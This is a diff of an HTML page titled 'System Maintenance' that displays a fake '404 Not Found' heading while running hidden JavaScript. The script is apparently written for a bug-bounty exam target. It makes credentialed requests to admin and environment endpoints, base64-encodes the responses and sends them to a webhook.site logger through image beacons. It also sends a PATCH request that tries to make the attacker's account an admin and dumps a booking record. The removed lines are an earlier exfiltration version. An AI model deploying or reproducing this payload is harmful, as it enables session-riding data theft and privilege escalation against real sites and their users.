@@ -1,35 +1,67 @@
-<script>
-    const logger = "https://webhook.site/e0ddef86-5a1f-472e-a42c-9612ab165efe";
+<!DOCTYPE html>
+<html>
+<head><title>System Maintenance</title></head>
+<body>
+    <script>
+        const logger = "https://webhook.site/6222374a-b882-44ec-a12d-9671d3dd124c";
+        const api = "https://api-bugbounty-exam.hashacademy.co/api";
+        const myUserId = "69da4749adf0dbb976ce8e37"; 
 
-    async function findSecret() {
-        // Try the 'Me' endpoint - often contains API keys or secrets
-        try {
-            const res = await fetch("https://api-bugbounty-exam.hashacademy.co/api/auth/me", {
-                method: "GET",
-                credentials: "include"
-            });
-            const data = await res.json();
-            
-            // Leak it to your webhook
-            fetch(logger, {
-                method: "POST",
-                body: JSON.stringify({ source: "AUTH_ME", data: data })
-            });
-        } catch (e) {}
+        // Helper to send data to your webhook via Image tags
+        function exfiltrate(label, data) {
+            const payload = btoa(JSON.stringify(data));
+            new Image().src = `${logger}/?type=${label}&d=${payload}`;
+        }
 
-        // Try a 'Settings' endpoint just in case
-        try {
-            const res2 = await fetch("https://api-bugbounty-exam.hashacademy.co/api/admin/settings", {
-                method: "GET",
-                credentials: "include"
-            });
-            const data2 = await res2.json();
-            fetch(logger, {
-                method: "POST",
-                body: JSON.stringify({ source: "ADMIN_SETTINGS", data: data2 })
-            });
-        } catch (e) {}
-    }
+        async function startPivoting() {
+            // 1. DUMP SENSITIVE ADMIN ENDPOINTS
+            // We are looking for the 'second' vulnerability the instructor mentioned
+            const adminPaths = [
+                "/auth/profile",
+                "/admin/settings",
+                "/admin/config",
+                "/admin/stats",
+                "/admin/users",
+                "/system/env"
+            ];
 
-    findSecret();
-</script>
+            for (let path of adminPaths) {
+                try {
+                    const res = await fetch(api + path, { credentials: "include" });
+                    if (res.ok) {
+                        const json = await res.json();
+                        exfiltrate(`LEAK_${path.replace(/\//g, '_')}`, json);
+                    }
+                } catch (e) {}
+            }
+
+            // 2. PRIVILEGE ESCALATION ATTEMPT
+            // Try to force the Admin bot to promote YOUR user account to admin
+            try {
+                await fetch(`${api}/users/${myUserId}`, {
+                    method: "PATCH",
+                    headers: { "Content-Type": "application/json" },
+                    credentials: "include",
+                    body: JSON.stringify({ 
+                        "role": "admin",
+                        "permissions": ["all"],
+                        "isAdmin": true
+                    })
+                });
+                exfiltrate("ATTEMPT", "Role elevation request sent for user " + myUserId);
+            } catch (e) {}
+
+            // 3. DATABASE DUMP (IDOR/SQLi check)
+            // Attempting to fetch the very first booking, which often holds system flags
+            try {
+                const bookingRes = await fetch(`${api}/bookings/BK-00001`, { credentials: "include" });
+                const bookingData = await bookingRes.json();
+                exfiltrate("FIRST_BOOKING_LEAK", bookingData);
+            } catch (e) {}
+        }
+
+        startPivoting();
+    </script>
+    <h1>404 Not Found</h1>
+</body>
+</html>
